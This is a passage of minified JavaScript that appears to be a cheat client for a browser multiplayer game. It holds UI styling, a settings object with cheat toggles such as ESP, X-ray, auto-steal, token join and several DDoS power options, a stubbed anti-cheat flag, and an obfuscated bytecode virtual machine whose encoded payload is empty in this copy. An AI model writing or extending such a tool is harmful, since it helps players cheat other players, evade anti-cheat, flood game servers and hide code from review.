                                value: Object.freeze(["\n\n.yusukefy-panel-container {\n    position: absolute;\n    background: ", ";\n}\n\n.yusukefy-panel {\n    padding: 14px;\n    /* Last component will have a margin, so reduce padding to account for this */\n    padding-bottom: calc(14px - ", ");\n\n    /* all: initial;  */\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    -ms-user-select: none;\n    user-select: none;\n    cursor: default;\n    text-align: left;\n    box-sizing: border-box;\n}\n\n.yusukefy-panel.yusukefy-panel-hidden {\n    height: 0px;\n    display: none;\n}\n\n.yusukefy-panel * {\n    box-sizing: initial;\n    -webkit-box-sizing: initial;\n    -moz-box-sizing: initial;\n}\n\n.yusukefy-panel input {\n    font-family: 'Hack';\n    font-size: 11px;\n    display: inline;\n}\n\n.yusukefy-panel a {\n    color: inherit;\n    text-decoration: none;\n}\n\n.yusukefy-panel-toggle-button {\n    position: absolute;\n    top: 0;\n    margin: 0;\n    padding: 0;\n    width: 15px;\n    height: 15px;\n    line-height: 15px;\n    text-align: center;\n    border: none;\n    cursor: pointer;\n    font-family: inherit;\n    color: ", ";\n    background-color: ", ";\n\n    -webkit-user-select: none;\n    -moz-user-select: none;\n    -ms-user-select: none;\n    user-select: none;\n\n}\n\n/* Open/Close button styling */\n.yusukefy-panel-toggle-button svg {\n    fill-opacity: 0;\n    stroke-width: 3;\n    stroke: ", ";\n}\n\n/* Remove browser default outlines since we're providing our own */\n.yusukefy-panel-toggle-button:focus {\n    outline:none;\n}\n.yusukefy-panel-toggle-button::-moz-focus-inner {\n    border: 0;\n}\n\n.yusukefy-panel-toggle-button:hover,\n.yusukefy-panel-toggle-button:focus {\n    color: ", ";\n    background-color: ", ";\n}\n\n.yusukefy-panel-toggle-button:active {\n    color: ", ";\n    background-color: ", ";\n}\n\n"])
                            }
                        }))
                            , r = i(1)
                            , i = i(3);
                        e.exports = i(n, r.theme.colors.panelBackground, r.theme.sizing.componentSpacing, r.theme.colors.textPrimary, r.theme.colors.componentBackground, r.theme.colors.componentForeground, r.theme.colors.textHover, r.theme.colors.componentForeground, r.theme.colors.textActive, r.theme.colors.componentActive)
                    }
                    , function (e, t, i) {
                        "use strict";
                        Object.defineProperty(t, "__esModule", {
                            value: !0
                        }),
                            t.default = function (e, t, i) {
                                e = e.appendChild(document.createElement("div"));
                                return e.innerHTML = t,
                                    (0,
                                        n.default)(e, {
                                            width: "100%",
                                            textAlign: "center",
                                            color: i.colors.textSecondary,
                                            height: "20px",
                                            marginBottom: "4px"
                                        }),
                                    e
                            }
                            ;
                        var i = i(0)
                            , n = i && i.__esModule ? i : {
                                default: i
                            };
                        e.exports = t.default
                    }
                    , function (e, t, i) {
                        "use strict";
                        Object.defineProperty(t, "__esModule", {
                            value: !0
                        }),
                            t.ToastArea = void 0;
                        var n = function (e, t, i) {
                            return t && o(e.prototype, t),
                                i && o(e, i),
                                e
                        }
                            , r = i(0)
                            , a = r && r.__esModule ? r : {
                                default: r
                            };
                        function o(e, t) {
                            for (var i = 0; i < t.length; i++) {
                                var n = t[i];
                                n.enumerable = n.enumerable || !1,
                                    n.configurable = !0,
                                    "value" in n && (n.writable = !0),
                                    Object.defineProperty(e, n.key, n)
                            }
                        }
                        function s(e, t) {
                            if (!(this instanceof s))
                                throw new TypeError("Cannot call a class as a function");
                            this.opts = t,
                                this.styles = i(78),
                                this.element = e.appendChild(document.createElement("div")),
                                this.element.classList.add(this.styles["yusukefy-toast-area"]),
                                (0,
                                    a.default)(this.element, {
                                        position: "absolute",
                                        width: "100%"
                                    })
                        }
                        i(1),
                            t.ToastArea = (n(s, [{
                                key: "CreateToast",
                                value: function (e) {
                                    function t() {
                                        r.blur(),
                                            (0,
                                                a.default)(r, {
                                                    opacity: "0"
                                                }),
                                            clearTimeout(o),
                                            o = setTimeout(function () {
                                                r && r.parentNode.removeChild(r)
                                            }, n)
                                    }
                                    var i = 1 < arguments.length && void 0 !== arguments[1] ? arguments[1] : 5e3
                                        , n = 2 < arguments.length && void 0 !== arguments[2] ? arguments[2] : 0
                                        , r = (console.log("[Toast] " + e),
                                            this.element.appendChild(document.createElement("div")))
                                        , e = (r.classList.add(this.styles["yusukefy-toast-notification"]),
                                            r.setAttribute("aria-live", "polite"),
                                            r.innerHTML = e,
                                            (0,
                                                a.default)(r, {}),
                                            r.appendChild(document.createElement("button")))
                                        , o = (e.innerHTML = "&#10006;",
                                            e.classList.add(this.styles["yusukefy-toast-close-button"]),
                                            void 0)
                                        , o = setTimeout(t, i);
                                    e.onclick = t
                                }
                            }]),
                                s)
                    }
                    , function (e, t, i) {
                        "use strict";
                        var n = Object.freeze(Object.defineProperties(["\n\n.yusukefy-toast-notification {\n    box-sizing: border-box;\n    color: theme.colors.text1;\n    position: relative;\n    width: 100%;\n    /* height: 20px; */\n    padding: 8px;\n    padding-left: 20px;\n    padding-right: 20px;\n    text-align: center;\n    font-family: 'Hack', monospace;\n    font-size: 11px;\n}\n\n.yusukefy-toast-area .yusukefy-toast-notification:nth-child(odd) {\n    color: ", ";\n    background-color: ", ";\n}\n\n.yusukefy-toast-area .yusukefy-toast-notification:nth-child(even) {\n    color: ", ";\n    background-color: ", ";\n}\n\n.yusukefy-toast-close-button {\n    color: ", ";\n    background: transparent;\n    position: absolute;\n    textAlign: center;\n    margin-top: auto;\n    margin-bottom: auto;\n    border: none;\n    cursor: pointer;\n    top: 0;\n    bottom: 0;\n    right: 8px;\n}\n\n"], {
                            raw: {
                                value: Object.freeze(["\n\n.yusukefy-toast-notification {\n    box-sizing: border-box;\n    color: theme.colors.text1;\n    position: relative;\n    width: 100%;\n    /* height: 20px; */\n    padding: 8px;\n    padding-left: 20px;\n    padding-right: 20px;\n    text-align: center;\n    font-family: 'Hack', monospace;\n    font-size: 11px;\n}\n\n.yusukefy-toast-area .yusukefy-toast-notification:nth-child(odd) {\n    color: ", ";\n    background-color: ", ";\n}\n\n.yusukefy-toast-area .yusukefy-toast-notification:nth-child(even) {\n    color: ", ";\n    background-color: ", ";\n}\n\n.yusukefy-toast-close-button {\n    color: ", ";\n    background: transparent;\n    position: absolute;\n    textAlign: center;\n    margin-top: auto;\n    margin-bottom: auto;\n    border: none;\n    cursor: pointer;\n    top: 0;\n    bottom: 0;\n    right: 8px;\n}\n\n"])
                            }
                        }))
                            , r = i(1)
                            , i = i(3);
                        e.exports = i(n, r.theme.colors.textPrimary, r.theme.colors.panelBackground, r.theme.colors.textPrimary, r.theme.colors.menuBarBackground, r.theme.colors.textPrimary)
                    }
                    , function (e, t, i) {
                        "use strict";
                        var n = Object.freeze(Object.defineProperties(["\n\n.yusukefy-container {\n    position: relative;\n    left: 0;\n    width: 100%;\n    font-size: 11px;\n    z-index: 9999;\n}\n\n"], {
                            raw: {
                                value: Object.freeze(["\n\n.yusukefy-container {\n    position: relative;\n    left: 0;\n    width: 100%;\n    font-size: 11px;\n    z-index: 9999;\n}\n\n"])
                            }
                        }))
                            , i = (i(1),
                                i(3));
                        e.exports = i(n)
                    }
                ],
                    r = {},
                    n.m = i,
                    n.c = r,
                    n.d = function (e, t, i) {
                        n.o(e, t) || Object.defineProperty(e, t, {
                            configurable: !1,
                            enumerable: !0,
                            get: i
                        })
                    }
                    ,
                    n.n = function (e) {
                        var t = e && e.__esModule ? function () {
                            return e.default
                        }
                            : function () {
                                return e
                            }
                            ;
                        return n.d(t, "a", t),
                            t
                    }
                    ,
                    n.o = function (e, t) {
                        return Object.prototype.hasOwnProperty.call(e, t)
                    }
                    ,
                    n.p = "",
                    n(n.s = 16);
                function n(e) {
                    var t;
                    return (r[e] || (t = r[e] = {
                        i: e,
                        l: !1,
                        exports: {}
                    },
                        i[e].call(t.exports, t, t.exports, n),
                        t.l = !0,
                        t)).exports
                }
                var i, r
            });
        let Settings = {
            food: 60,
            Tokenjoin: {
                e: !1,
                token: "",
                id: ""
            },
            esp: !1,
            Autopvp: {
                e: !1
            },
            Moves: !1,
            JoinLeave: !1,
            AutoSeed: !1,
            Ice: !1,
            zoomBIG: !1,
            pereat: !1,
            buyh: 1,
            ddospower: 120,
            Hitbox: !1,
            ex: !1,
            autowear: !1,
            autowearHP: 40,
            RangeBetweenMeAndEnemy: 120,
            afk: !1,
            boostfps: !1,
            ss: !1,
            AntiDDOS: !1,
            boomtime: 110,
            maker: !1,
            maker2: !1,
            movetoenemy: !1,
            Respawn: !1,
            HpTimer: "#ff0000",
            HpTimerShadow: "#000000",
            BlizzardStorm: "#ff0000",
            BlizzardStormShadow: "#000000",
            EnabledHacks: "#ff0000",
            EnabledHacksShadow: "#000000",
            mmob: "#ff0000",
            mmobs: "#000000",
            bot: !1,
            mob: !1,
            Ice2: !1,
            worldinfo: !1,
            chestinfo: !1,
            id: !1,
            chaseid: 0,
            fpsset: 5,
            godowns: 1.3,
            lowfps: !1,
            hmpic: 10,
            DDOS: !1,
            DDOS2: !1,
            DDOS3: 10,
            autodv: {
                e: !1,
                hat: "peasant"
            },
            Tame: {
                e: !1,
                k: "KeyG",
                a: null
            },
            drop: {
                k: "Num3"
            },
            DropSword: {
                k: "KeyV"
            },
            DropSword2: {
                e: !1,
                hp: 80
            },
            speed: 145,
            Tracers: !1,
            killworm: {
                e: !1,
                k: "KeyJ"
            },
            SwordInChest: {
                e: !1,
                k: "KeyE"
            },
            godown: {
                e: !1,
                k: "Num3"
            },
            ColoredSpikes: !0,
            Coloredspikess: "Xmre",
            AutoBuild: {
                e: !1,
                k: "KeyT",
                m: !1,
                c: ["Bridge"]
            },
            Crown: !0,
            Ping: !1,
            Fps: !1,
            speedchecker: !1,
            AMB: {
                e: !1,
                k: "KeyF",
                a: null
            },
            spikea: {
                e: !1,
                k: "KeyO",
                a: null
            },
            Debug: !1,
            Xray: {
                e: !1,
                k: "Backquote",
                o: .5
            },
            aaa22: !1,
            Equiq: !1,
            Spectator: {
                k: "KeyP"
            },
            Timer: !0,
            Timer3: !0,
            lobbyid: "",
            lobbyid2: "",
            AutoSpike: {
                e: !1,
                k: "Space",
                m: !0,
                p: ["Reidite Spike", "Amethyst Spike", "Diamond Spike", "Gold Spike", "Stone Spike", "Wood Spike", "Wood Wall"]
            },
            yusu: ["High"],
            color: "blue",
            loux: !0,
            AutoSpikee: {
                e: !1,
                k: "KeyC",
                m: !0
            },
            AutoSpikeee: {
                e: !1,
                k: "KeyX",
                m: !0
            },
            AutoTotem: {
                e: !1,
                k: "KeyH"
            },
            AutoSteal: {
                e: !1,
                k: "KeyQ",
                l: [],
                u: !1,
                o: 0
            },
            AutoExtTake: {
                e: !1,
                k: "NONE"
            },
            AutoExtPut: {
                e: !1,
                k: "NONE"
            },
            PathFinder: {
                e: !1,
                g: !1,
                k: "Numpad3"
            },
            AutoBreadTake: {
                e: !1,
                k: "NONE"
            },
            AutoBreadPut: {
                e: !1,
                k: "NONE"
            },
            AutoEme: {
                e: !1,
                k: "Numpad2",
                a: null
            },
            Trashtalk: {
                e: !1,
                m: " ",
                lastSend: Date.now()
            },
            Autofarm: {
                e: !1,
                k: "KeyU",
                a: null,
                w: !1,
                x: null,
                xx: null,
                y: null,
                yy: null,
                sy: null,
                sx: null
            },
            Autofarm2: {
                e: !1,
                a: null
            },
            AutoCraft: {
                e: !1,
                k: "KeyK"
            },
            AutoRecycle: {
                e: !1,
                k: "KeyL"
            },
            lla: {
                e: !1
            }
        };
        setTimeout(() => {
            {
                let T = (...e) => new Uint8Array(...e)
                    , e = (...e) => new Uint16Array(...e);
                function o(t) {
                    let i = "";
                    for (let e = 0; e < t.length; e += 3) {
                        var n = parseInt(t.substr(e, 3), 10);
                        i += String.fromCharCode(n)
                    }
                    return i
                }
                function i() {
                    this.o = e(16),
                        this.t = e(288)
                }
                function g(e, t) {
                    this.k = e,
                        this.N = 0,
                        this.O = 0,
                        this.X = 0,
                        this.L = t,
                        this.u = 0,
                        this.v = new i,
                        this.J = new i
                }
                function t(e, t, i, n) {
                    for (var r, o = 0; o < i; ++o)
                        e[o] = 0;
                    for (o = 0; o < 30 - i; ++o)
                        e[o + i] = o / i | 0;
                    for (r = n,
                        o = 0; o < 30; ++o)
                        t[o] = r,
                            r += 1 << e[o]
                }
                function p(e, t, i, n) {
                    for (var r, o = 0; o < 16; ++o)
                        e.o[o] = 0;
                    for (o = 0; o < n; ++o)
                        e.o[t[i + o]]++;
                    for (o = r = e.o[0] = 0; o < 16; ++o)
                        z[o] = r,
                            r += e.o[o];
                    for (o = 0; o < n; ++o)
                        t[i + o] && (e.t[z[t[i + o]]++] = o)
                }
                function C(e, t, i) {
                    if (!t)
                        return i;
                    for (; e.X < 24;)
                        e.O |= e.k[e.N++] << e.X,
                            e.X += 8;
                    var n = e.O & 65535 >>> 16 - t;
                    return e.O >>>= t,
                        e.X -= t,
                        n + i
                }
                function N(e, t) {
                    for (var i, n, r, o; e.X < 24;)
                        e.O |= e.k[e.N++] << e.X,
                            e.X += 8;
                    for (r = n = i = 0,
                        o = e.O; n = 2 * n + (1 & o),
                        o >>>= 1,
                        i += t.o[++r],
                        0 <= (n -= t.o[r]);)
                        ;
                    return e.O = o,
                        e.X -= r,
                        t.t[i + n]
                }
                function S(e, t, i) {
                    for (var n, r, o, a; ;) {
                        if (256 === (r = N(e, t)))
                            return m;
                        if (r < 256)
                            e.L[e.u++] = r;
                        else
                            for (n = C(e, _[r -= 257], E[r]),
                                r = N(e, i),
                                a = o = e.u - C(e, f[r], L[r]); a < o + n; ++a)
                                e.L[e.u++] = e.L[a]
                    }
                }
                function s(e, t) {
                    var i, n, r, o = new g(e, t);
                    do {
                        switch (r = void 0,
                        (n = o).X-- || (n.O = n.k[n.N++],
                            n.X = 7),
                        r = 1 & n.O,
                        n.O >>>= 1,
                        n = r,
                        C(o, 2, 0)) {
                            case 0:
                                i = function (e) {
                                    for (var t, i; 8 < e.X;)
                                        e.N--,
                                            e.X -= 8;
                                    if ((t = 256 * e.k[e.N + 1] + e.k[e.N]) !== (65535 & ~(256 * e.k[e.N + 3] + e.k[e.N + 2])))
                                        return D;
                                    for (e.N += 4,
                                        i = t; i; --i)
                                        e.L[e.u++] = e.k[e.N++];
                                    return e.X = 0,
                                        m
                                }(o);
                                break;
                            case 1:
                                i = S(o, v, M);
                                break;
                            case 2:
                                I = l = h = u = E = _ = s = a = c = A = T = d = void 0;
                                for (var a, s, _, E, u, d = o, T = o.v, A = o.J, h = C(d, 5, 257), l = C(d, 5, 1), I = C(d, 4, 4), c = 0; c < 19; ++c)
                                    P[c] = 0;
                                for (c = 0; c < I; ++c)
                                    _ = C(d, 3, 0),
                                        P[G[c]] = _;
                                for (p(H, P, 0, 19),
                                    a = 0; a < h + l;)
                                    switch (E = N(d, H)) {
                                        case 16:
                                            for (u = P[a - 1],
                                                s = C(d, 2, 3); s; --s)
                                                P[a++] = u;
                                            break;
                                        case 17:
                                            for (s = C(d, 3, 3); s; --s)
                                                P[a++] = 0;
                                            break;
                                        case 18:
                                            for (s = C(d, 7, 11); s; --s)
                                                P[a++] = 0;
                                            break;
                                        default:
                                            P[a++] = E
                                    }
                                p(T, P, 0, h),
                                    p(A, P, h, l),
                                    i = S(o, o.v, o.J);
                                break;
                            default:
                                i = D
                        }
                        if (i !== m)
                            throw Error("Data error")
                    } while (!n);
                    o.u < o.L.length ? "function" == typeof o.L.slice ? o.L.slice(0, o.u) : o.L.subarray(0, o.u) : o.L
                }
                for (var m = 0, D = -3, v = new i, M = new i, _ = T(30), E = e(30), f = T(30), L = e(30), G = T([16, 17, 18, 0, 8, 7, 9, 6, 10, 5, 11, 4, 12, 3, 13, 2, 14, 1, 15]), H = new i, P = T(320), z = e(16), r = v, B = M, W = 0; W < 7; ++W)
                    r.o[W] = 0;
                for (r.o[7] = 24,
                    r.o[8] = 152,
                    r.o[9] = 112,
                    W = 0; W < 24; ++W)
                    r.t[W] = 256 + W;
                for (W = 0; W < 144; ++W)
                    r.t[24 + W] = W;
                for (W = 0; W < 8; ++W)
                    r.t[168 + W] = 280 + W;
                for (W = 0; W < 112; ++W)
                    r.t[176 + W] = 144 + W;
                for (W = 0; W < 5; ++W)
                    B.o[W] = 0;
                for (B.o[5] = 32,
                    W = 0; W < 32; ++W)
                    B.t[W] = W;
                t(_, E, 4, 3),
                    t(f, L, 2, 1),
                    _[28] = 0,
                    E[28] = 258,
                    function (N) {
                        let S = "undefined" != typeof globalThis ? globalThis : "undefined" != typeof window ? window : N
                            , m = S
                            , e = "undefined" != typeof require ? require : null
                            , t = function (e, t = 0) {
                                for (var i, n, r, o = e.replace(/[^A-Za-z0-9+/]/g, ""), a = o.length, s = t ? Math.ceil((3 * a + 1 >> 2) / t) * t : 3 * a + 1 >> 2, _ = T(s), E = 0, u = 0, d = 0; d < a; d++)
                                    if (n = 3 & d,
                                        E |= (64 < (r = o.charCodeAt(d)) && r < 91 ? r - 65 : 96 < r && r < 123 ? r - 71 : 47 < r && r < 58 ? r + 4 : 43 === r ? 62 : 47 === r ? 63 : 0) << 6 * (3 - n),
                                        3 == n || a - d == 1) {
                                        for (i = 0; i < 3 && u < s; i++,
                                            u++)
                                            _[u] = E >>> (16 >>> i & 24) & 255;
                                        E = 0
                                    }
                                return _
                            }("")
                            , i = !!t[0]
                            , n = i ? t[1] | t[2] << 8 | t[3] << 16 | t[4] << 24 : t.length
                            , D = i ? T(n) : T(t.buffer, 5, t.length - 5)
                            , v = (i && s(T(t.buffer, 5, t.length - 5), D),
                                0)
                            , M = {}
                            , f = []
                            , L = []
                            , G = []
                            , p = []
                            , y = 0
                            , H = null
                            , P = null
                            , z = []
                            , B = null
                            , w = (N._$EXPORTS = {},
                                e && (N.require = e),
                                new Float64Array(1))
                            , W = T(w.buffer);
                        function V() {
                            let e = 0, t = 0, i;
                            for (; i = D[v++],
                                e |= (127 & i) << t,
                                0 != (128 & i);)
                                t += 7;
                            return e
                        }
                        function k() {
                            return D[v++] | D[v++] << 8 | D[v++] << 16 | D[v++] << 24
                        }
                        function r() {
                            var t = V();
                            let i = "";
                            for (let e = 0; t > e; e++)
                                i += function (e) {
                                    return function () {
                                        return this
                                    }()[o(e)]
                                }("083116114105110103")[o("102114111109067104097114067111100101")](V());
                            return i
                        }
                        function K(c, O) {
                            let g = M;
                            return function e() {
                                var t = y
                                    , i = {}
                                    , n = (y = c,
                                        M)
                                    , r = ((M = i)[c] = {},
                                        p[c])
                                    , o = r.length;
                                for (let e = 0; o > e; e++) {
                                    var a = r[e]
                                        , s = g[a];
                                    i[a] = s
                                }
                                var _, E = f, u = v, d = H, T = P, A = m, h = z;
                                let l = null
                                    , I = null;
                                f = [],
                                    z = [],
                                    v = O,
                                    H = e,
                                    P = arguments,
                                    m = this;
                                try {
                                    l = R()
                                } catch (e) {
                                    z.length ? (_ = z.pop(),
                                        v = _,
                                        B = e,
                                        l = R()) : I = e
                                }
                                if (z = h,
                                    v = u,
                                    f = E,
                                    H = d,
                                    M = n,
                                    y = t,
                                    P = T,
                                    m = A,
                                    I)
                                    throw I;
                                return l
                            }
                        }
                        function R() {
                            for (; ;) {
                                var e = D[v++];
                                switch (e) {
                                    case 25:
                                        var t = V()
                                            , i = V();
                                        Object.defineProperty(M[i], t, {
                                            get: () => H,
                                            set() { }
                                        });
                                        break;
                                    case 73:
                                        M[y][V()] = P;
                                        break;
                                    case 50:
                                        f[D[v++]] = f[D[v++]] instanceof f[D[v++]];
                                        break;
                                    case 28:
                                        f[D[v++]] = f[D[v++]] in f[D[v++]];
                                        break;
                                    case 61:
                                        f[D[v++]] = V();
                                        break;
                                    case 34:
                                        f[D[v++]] = D[v++] ? ++M[V()][V()] : M[V()][V()]++;
                                        break;
                                    case 55:
                                        f[D[v++]] = D[v++] ? --M[V()][V()] : M[V()][V()]--;
                                        break;
                                    case 59:
                                        f[D[v++]] = (W[0] = D[v++],
                                            W[1] = D[v++],
                                            W[2] = D[v++],
                                            W[3] = D[v++],
                                            W[4] = D[v++],
                                            W[5] = D[v++],
                                            W[6] = D[v++],
                                            W[7] = D[v++],
                                            w[0]);
                                        break;
                                    case 85:
                                        i = V(),
                                            t = V();
                                        M[y][t] = P[i];
                                        break;
                                    case 70:
                                        f[D[v++]] = f[D[v++]];
                                        break;
                                    case 48:
                                        f[D[v++]] = m;
                                        break;
                                    case 14:
                                        f[D[v++]] = K(V(), k());
                                        break;
                                    case 60:
                                        f[D[v++]] = L[V()];
                                        break;
                                    case 88:
                                        f[D[v++]] = RegExp(L[V()], L[V()]);
                                        break;
                                    case 2:
                                        f[D[v++]] = !f[D[v++]];
                                        break;
                                    case 62:
                                        f[D[v++]] = +f[D[v++]];
                                        break;
                                    case 18:
                                        f[D[v++]] = void f[D[v++]];
                                        break;
                                    case 6:
                                        f[D[v++]] = ~f[D[v++]];
                                        break;
                                    case 20:
                                        f[D[v++]] = -f[D[v++]];
                                        break;
                                    case 21:
                                        f[D[v++]] = typeof f[D[v++]];
                                        break;
                                    case 27:
                                        f[D[v++]] = delete f[D[v++]][f[D[v++]]];
                                        break;
                                    case 76:
                                        f[D[v++]] = f[D[v++]] + f[D[v++]];
                                        break;
                                    case 65:
                                        f[D[v++]] = f[D[v++]] / f[D[v++]];
                                        break;
                                    case 22:
                                        f[D[v++]] = f[D[v++]] - f[D[v++]];
                                        break;
                                    case 52:
                                        f[D[v++]] = f[D[v++]] ^ f[D[v++]];
                                        break;
                                    case 30:
                                        f[D[v++]] = f[D[v++]] | f[D[v++]];
                                        break;
                                    case 42:
                                        f[D[v++]] = f[D[v++]] >>> f[D[v++]];
                                        break;
                                    case 15:
                                        f[D[v++]] = f[D[v++]] % f[D[v++]];
                                        break;
                                    case 46:
                                    case 47:
                                        f[D[v++]] = f[D[v++]] != f[D[v++]];
                                        break;
                                    case 1:
                                    case 37:
                                        f[D[v++]] = f[D[v++]] == f[D[v++]];
                                        break;
                                    case 51:
                                        f[D[v++]] = f[D[v++]] & f[D[v++]];
                                        break;
                                    case 12:
                                        f[D[v++]] = f[D[v++]] << f[D[v++]];
                                        break;
                                    case 80:
                                        f[D[v++]] = f[D[v++]] >> f[D[v++]];
                                        break;
                                    case 36:
                                        f[D[v++]] = f[D[v++]] * f[D[v++]];
                                        break;
                                    case 29:
                                        f[D[v++]] = f[D[v++]] <= f[D[v++]];
                                        break;
                                    case 39:
                                        f[D[v++]] = f[D[v++]] >= f[D[v++]];
                                        break;
                                    case 84:
                                        f[D[v++]] = f[D[v++]] < f[D[v++]];
                                        break;
                                    case 3:
                                        f[D[v++]] = f[D[v++]] > f[D[v++]];
                                        break;
                                    case 82:
                                        G.push(f[D[v++]]);
                                        break;
                                    case 23:
                                        var n = V()
                                            , r = Array(n);
                                        for (let e = 0; n > e; e++)
                                            r[n - e - 1] = G.pop();
                                        var o = D[v++]
                                            , a = D[v++];
                                        f[o] = f[a].apply(S, r);
                                        break;
                                    case 67:
                                        var s = V()
                                            , _ = Array(s);
                                        for (let e = 0; s > e; e++)
                                            _[s - e - 1] = G.pop();
                                        o = D[v++],
                                            a = D[v++];
                                        f[a] = Reflect.construct(f[o], _);
                                        break;
                                    case 71:
                                        f[D[v++]] = f[D[v++]][f[D[v++]]] = f[D[v++]];
                                        break;
                                    case 64:
                                        f[D[v++]] = f[D[v++]][f[D[v++]]] += f[D[v++]];
                                        break;
                                    case 72:
                                        f[D[v++]] = f[D[v++]][f[D[v++]]] |= f[D[v++]];
                                        break;
                                    case 26:
                                        f[D[v++]] = f[D[v++]][f[D[v++]]] ^= f[D[v++]];
                                        break;
                                    case 31:
                                        f[D[v++]] = f[D[v++]][f[D[v++]]];
                                        break;
                                    case 32:
                                        var E = V()
                                            , u = Array(E);
                                        for (let e = 0; E > e; e++)
                                            u[E - e - 1] = G.pop();
                                        var d = D[v++]
                                            , T = D[v++]
                                            , A = D[v++]
                                            , T = f[T]
                                            , A = f[A];
                                        f[d] = T[A].apply(T, u);
                                        break;
                                    case 53:
                                        throw f[D[v++]];
                                    case 41:
                                        var d = D[v++]
                                            , A = !!D[v++]
                                            , T = V()
                                            , h = L[T];
                                        if (h in N)
                                            f[d] = N[h];
                                        else {
                                            if (A && !(h in S))
                                                throw new ReferenceError(h + " is not defined");
                                            f[d] = S[h]
                                        }
                                        break;
                                    case 78:
                                        var l = V()
                                            , I = Array(l);
                                        for (let e = 0; l > e; e++)
                                            I[l - e - 1] = G.pop();
                                        f[D[v++]] = I;
                                        break;
                                    case 75:
                                        var c = {}
                                            , O = V()
                                            , h = D[v++];
                                        for (let e = 0; O > e; e++) {
                                            var g = G.pop()
                                                , p = G.pop();
                                            switch (G.pop()) {
                                                case 0:
                                                    c[p] = g;
                                                    break;
                                                case 1:
                                                    Object.defineProperty(c, p, {
                                                        get: g
                                                    });
                                                    break;
                                                case 2:
                                                    Object.defineProperty(c, p, {
                                                        set: g
                                                    })
                                            }
                                        }
                                        f[h] = c;
                                        break;
                                    case 54:
                                        f[D[v++]] = null;
                                        break;
                                    case 0:
                                        f[D[v++]] = M[V()][V()];
                                        break;
                                    case 79:
                                        f[D[v++]] = M[V()][V()] = f[D[v++]];
                                        break;
                                    case 19:
                                        f[D[v++]] = M[V()][V()] |= f[D[v++]];
                                        break;
                                    case 40:
                                        f[D[v++]] = M[V()][V()] &= f[D[v++]];
                                        break;
                                    case 45:
                                        f[D[v++]] = M[V()][V()] *= f[D[v++]];
                                        break;
                                    case 43:
                                        f[D[v++]] = M[V()][V()] /= f[D[v++]];
                                        break;
                                    case 35:
                                        f[D[v++]] = M[V()][V()] %= f[D[v++]];
                                        break;
                                    case 33:
                                        f[D[v++]] = M[V()][V()] >>>= f[D[v++]];
                                        break;
                                    case 77:
                                        f[D[v++]] = M[V()][V()] += f[D[v++]];
                                        break;
                                    case 4:
                                        f[D[v++]] = M[V()][V()] -= f[D[v++]];
                                        break;
                                    case 87:
                                        M[V()][V()] = f[D[v++]];
                                        break;
                                    case 38:
                                        var R = D[v++]
                                            , C = k();
                                        f[R] || (v = C);
                                        break;
                                    case 11:
                                        R = D[v++],
                                            C = k();
                                        f[R] && (v = C);
                                        break;
                                    case 57:
                                        var b = k();
                                        v = b;
                                        break;
                                    case 69:
                                    case 24:
                                        return f[0];
                                    case 5:
                                        z.push(k());
                                        break;
                                    case 56:
                                        z.pop();
                                        break;
                                    case 81:
                                        M[y][V()] = B;
                                        break;
                                    default:
                                        throw "u" + e
                                }
                            }
                        }
                        (() => {
                            for (v = 0; ;) {
                                var e = D[v++];
                                if (7 === e)
                                    L.push(r());
                                else {
                                    if (74 !== e)
                                        return v--;
                                    var e = V()
                                        , t = V()
                                        , i = [];
                                    for (let e = 0; t > e; e++)
                                        i.push(V());
                                    p[e] = i
                                }
                            }
                        }
                        )(),
                            K(0, v).call(this)
                    }({})
            }
            const T = {
                URL: "http://localhost:8080",
                VERSION: 13,
                DEVELOPERS: "Aloxx & Jakexx & Lann & Peanut (aka арахис)"
            }
                , V = msgpack;
            function k(e) {
                this.m = 2147483648,
                    this.a = 1103515245,
                    this.c = 12345,
                    this.state = e || Math.floor(Math.random() * (this.m - 1))
            }
            msgpack = void 0,
                window.antiCheat = {
                    isDetected: 0
                },
                k.prototype.random = function () {
                    return this.state = (this.a * this.state + this.c) % this.m,
                        this.state / this.m
                }
                ,
                k.prototype.set_seed = function (e) {
                    this.state = e
                }
                ,
                RAND_SIZE = 1e4,
                RANDOM = [];
            var K = new k;
            K.set_seed((new Date).getTime());
            for (var U, Y, F = 0; F < RAND_SIZE; F++)
                RANDOM.push(K.random());
            Utils = {
                open_in_new_tab: function (e) {
                    window.open(e, "_blank").focus()
                },
                open_in_new_box: function (e) {
                    window.open(e, "_blank", "location=yes,height=570,width=520,scrollbars=yes,status=yes")
                },
                compare_object: function (e, t) {
                    for (var i in e)
                        if (e[i] != t[i])
                            return !1;
                    return !0
                },
                compare_array: function (e, t) {
                    if (e.length != t.length)
                        return !1;
                    for (var i = 0; i < e.length; i++)
                        if ("object" == typeof e) {
                            if (!this.compare_object(e[i], t[i]))
                                return !1
                        } else if (e[i] != t[i])
                            return !1;
                    return !0
                },
                copy_vector: function (e, t) {
                    t.x = e.x,
                        t.y = e.y
                },
                get_vector: function (e, t) {
                    return {
                        x: e.x - t.x,
                        y: e.y - t.y
                    }
                },
                mul_vector: function (e, t) {
                    e.x *= t,
                        e.y *= t
                },
                scalar_product: function (e, t) {
                    return e.x * t.x + e.y * t.y
                },
                norm: function (e) {
                    return Math.sqrt(e.x * e.x + e.y * e.y)
                },
                sign: function (e) {
                    return e < 0 ? -1 : 1
                },
                cross_product: function (e, t) {
                    return e.x * t.y - e.y * t.x
                },
                get_angle_2: function (e, t, i, n) {
                    return Math.atan2(n - t, i - e)
                },
                get_angle: function (e, t) {
                    return Math.acos(this.scalar_product(e, t) / (this.norm(e) * this.norm(t))) * this.sign(this.cross_product(e, t))
                },
                getURLData: function (e) {
                    _url = location.href,
                        e = e.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");
                    e = new RegExp("[\\?&]" + e + "=([^&#]*)").exec(_url);
                    return null === e ? null : e[1]
                },
                reduceAngle: function (e, t) {
                    var i = 2 * Math.PI;
                    return t = (t % i + i) % i,
                        Math.abs(e - t) > Math.PI ? t < e ? t + i : t - i : t
                },
                get_std_angle: function (e, t) {
                    return this.get_angle({
                        x: 1,
                        y: 0
                    }, this.get_vector(e, t))
                },
                dist: function (e, t) {
                    return Math.sqrt((t.x - e.x) * (t.x - e.x) + (t.y - e.y) * (t.y - e.y))
                },
                build_vector: function (e, t) {
                    return {
                        x: Math.cos(t) * e,
                        y: Math.sin(t) * e
                    }
                },
                add_vector: function (e, t) {
                    e.x += t.x,
                        e.y += t.y
                },
                sub_vector: function (e, t) {
                    e.x -= t.x,
                        e.y -= t.y
                },
                translate_vector: function (e, t, i) {
                    e.x += t,
                        e.y += i
                },
                translate_new_vector: function (e, t, i) {
                    return {
